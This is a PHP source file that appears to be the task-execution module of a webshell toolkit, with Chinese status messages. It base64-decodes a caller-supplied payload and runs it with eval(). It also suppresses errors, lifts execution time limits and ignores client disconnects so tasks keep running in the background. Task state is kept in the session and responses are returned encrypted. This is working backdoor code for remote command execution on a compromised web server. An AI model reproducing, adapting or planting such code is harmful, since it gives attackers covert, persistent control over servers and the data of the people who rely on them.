<?
@error_reporting(0);
function main($taskID, $action, $payload)
{
    @set_time_limit(0);
    @ignore_user_abort(1);
    @ini_set('max_execution_time', 0);


    $result = array();
    if ($action == "submit") {

        @session_start();
        if (isset($_SESSION[$taskID]) && $_SESSION[$taskID]["running"]) {
            $result["status"] = base64_encode("fail");
            $result["msg"] = base64_encode("同一个插件只允许同时运行一个任务。");
            echo encrypt(json_encode($result)); 
            return;
        }

        @session_write_close();
        try
        {
            eval(base64_decode($payload));
        }
        catch(Throwable $e)
        {
            $result["status"] = "fail";
            $result["msg"] = $e->getMessage();
            echo "Errror";
            echo encrypt(json_encode($result));
            return;
        }

        finish();
        execute($taskID,$params);
    }
    else if ($action=="exec")
    {
        @session_start();
        if (isset($_SESSION[$taskID]) && $_SESSION[$taskID]["running"]) {
            $result["status"] = "fail";
            $result["msg"] = "同一个插件只允许同时运行一个任务。";
            echo encrypt(json_encode($result)); 
            return;
        }
        @session_write_close();
        try
        {
            eval(base64_decode($payload));
            $taskResult=array();
            execute($taskResult,$params);
            $result["status"] = "success";
            $result["msg"] = json_encode($taskResult);
        }
        catch(Throwable $e)
        {
            $result["status"] = "fail";
            $result["msg"] = $e->getMessage();
        }
        finally
        {
            echo encrypt(json_encode($result));
            return;
        }
    }
    else if ($action=="getResult")
    {
        @session_start();
        $taskResult=$_SESSION[$taskID];
        $taskResult["running"] = base64_encode($taskResult["running"]);
        $taskResult["result"] = base64_encode($taskResult["result"]);
        @session_write_close();
        $result["status"] = base64_encode("success");
        $result["msg"] = base64_encode(json_encode($taskResult));
        echo encrypt(json_encode($result));
        return;
    }
    else if ($action=="stop")
    {
        @session_start();
        $_SESSION[$taskID]["running"] = "false";
        @session_write_close();
        $result["status"] = base64_encode("success");
        $result["msg"] = base64_encode("ok");
        echo encrypt(json_encode($result));
        return;
    }
}
function finish()
{
    ob_end_clean();
    header("Connection: close");
    ignore_user_abort();
    ob_start();
    $size = ob_get_length();
    header("Content-Length: $size");
    ob_end_flush();
    flush();
}